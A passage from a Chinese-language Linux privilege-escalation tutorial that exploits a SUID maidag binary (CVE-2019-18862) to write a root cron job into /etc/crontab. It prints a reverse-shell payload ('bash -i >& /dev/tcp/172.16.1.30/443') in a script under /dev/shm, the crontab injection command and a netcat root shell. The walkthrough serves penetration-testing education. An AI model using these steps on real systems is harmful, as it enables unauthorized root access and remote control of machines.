d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629363-1106291149-4d0a25e8575c83ffb8a93fd3576e7264.png" width="512" height="160" class="img_ev3q"></p>
<p>读取TXT文件，显示如下：</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182631136-2072735557-d2e8428578937c88562f2be9512ecf10.png" width="880" height="647" class="img_ev3q"></p>
<p>看起来很简单，而且我们不需要脚本来自动完成这项工作。</p>
<blockquote>
<p>在上面的 Google 搜索中，GitHub 上有一个<a href="https://github.com/bcoles/local-exploits/tree/master/CVE-2019-18862" target="_blank" rel="noopener noreferrer">漏洞利用程序</a>，它以两种不同的方式为您自动执行此漏洞利用程序。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="62添加恶意-cron-作业并获取-root-shell"><strong><div id="id6.2">6.2、添加恶意 Cron 作业并获取 Root Shell</div></strong><a href="#62添加恶意-cron-作业并获取-root-shell" class="hash-link" aria-label="62添加恶意-cron-作业并获取-root-shell的直接链接" title="62添加恶意-cron-作业并获取-root-shell的直接链接">​</a></h4>
<p>首先，我们将在受害者上制作一个有效负载，该有效负载将在我们创建的 cron 作业中执行。</p>
<p>但首先，我们需要快速确认 cron 守护进程正在运行。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">service cron status</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629750-1517478028-5b26543352933ac37940d27f3e6c487d.png" width="697" height="191" class="img_ev3q"></p>
<p>Great！它正在运行，所以我们知道这个漏洞应该有效。</p>
<p>在本例中，我们将在 /dev/shm 目录中制作一个有效载荷，以向攻击者机器发回反向 shell。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /dev/shm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;#!/bin/bash&#x27; &gt; rootme.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;&#x27; &gt;&gt; rootme.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;bash -i &gt;&amp; /dev/tcp/172.16.1.30/443 0&gt;&amp;1&#x27; &gt;&gt; rootme.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630433-340883884-841f5ee8d2367b3f052fe9ec82a1526d.png" width="761" height="143" class="img_ev3q"></p>
<p>好了，脚本已经制作好了，现在只需要设置执行权限即可。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod 755 /dev/shm/rootme.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629172-31540392-b475ea3443a8249259e2e67f86113329.png" width="508" height="58" class="img_ev3q"></p>
<p>接下来，我们需要创建 <strong>crontab.in</strong> 文件，将我们的恶意 cron 作业写入 crontab。</p>
<blockquote>
<p>请注意，描述说要使此功能正常工作，请将 crontab.in 文件的第一行留空。</p>
</blockquote>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;&#x27; &gt; crontab.in</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo &#x27;* * * * *       root    /dev/shm/rootme.sh&#x27; &gt;&gt; crontab.in</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629926-637461459-2426e8e9c543ec94839430fd7d911407.png" width="737" height="97" class="img_ev3q"></p>
<p>最后，我们准备运行 <strong>maidag</strong> 二进制文件并将恶意条目注入到 crontab 中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/sbin/maidag --url /etc/crontab &lt; /dev/shm/crontab.in</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629598-1090988010-2cf937313c83229d77ce62f18a54ace3.png" width="729" height="44" class="img_ev3q"></p>
<p>运行 <strong>maidag</strong> 二进制文件后，我们可以看到它有效并且 crontab 已更新！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630105-964293000-0bd6efe769d265ecd04700205e3148b7.png" width="824" height="286" class="img_ev3q"></p>
<p>这将每分钟运行一次 cron 作业并执行我们以 root 身份创建的恶意 rootme.sh 脚本。</p>
<p>剩下要做的就是在我们的攻击者机器上启动一个 netcat 监听器，然后等待 root shell 进入。</p>
<p>不到一分钟，root shell 就登录了！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629660-1352695569-ff87bc464cc584a9d0a53a0d69111da6.png" width="654" height="173" class="img_ev3q"></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Linux 提权/Linux 提权-SUID_SGID_1"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Linux 提权-SUID_SGID_1</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Linux 提权/Linux 提权-Sudo_1"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Linux 提权-Sudo_1</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1上文回顾" class="table-of-contents__link toc-highlight"><strong><div>1、上文回顾</div></strong></a></li><li><a href="#2枚举自定义-suid-二进制文件" class="table-of-contents__link toc-highlight"><strong><div>2、枚举自定义 SUID 二进制文件</div></strong></a></li><li><a href="#3利用-suid-二进制文件--共享对象注入" class="table-of-contents__link toc-highlight"><strong><div>3、利用 SUID 二进制文件 – 共享对象注入</div></strong></a></li><li><a href="#4利用-suid-二进制文件--path-注入" class="table-of-contents__link toc-highlight"><strong><div>4、利用 SUID 二进制文件 – PATH 注入</div></strong></a></li><li><a href="#5利用-suid-二进制文件--滥用-shell-功能" class="table-of-contents__link toc-highlight"><strong><div>5、利用 SUID 二进制文件 – 滥用 Shell 功能</div></strong></a></li><li><a href="#6利用-suid-二进制文件--第三方程序中打包的二进制文件" class="table-of-contents__link toc-highlight"><strong><div>6、利用 SUID 二进制文件 – 第三方程序中打包的二进制文件</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>